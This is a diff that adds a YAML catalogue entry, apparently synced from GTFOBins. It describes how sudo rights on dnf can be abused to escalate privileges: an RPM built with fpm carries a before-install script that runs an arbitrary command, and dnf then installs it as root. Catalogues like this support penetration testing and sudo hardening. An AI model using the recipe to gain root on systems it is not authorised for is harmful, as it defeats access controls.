@@ -1,0 +1,38 @@
+id: gtfobins/dnf/command/sudo
+type: binary
+platform: linux
+name: dnf
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
+  comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to
+    the target.
+
+
+    ```
+
+    echo /path/to/command >x.sh
+
+    fpm -n x -s dir -t rpm -a all --before-install x.sh .
+
+    ```
+
+
+    The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.'
+references:
+- https://gtfobins.github.io/gtfobins/dnf/
+tags:
+- linux
+- unix
+- gtfobins
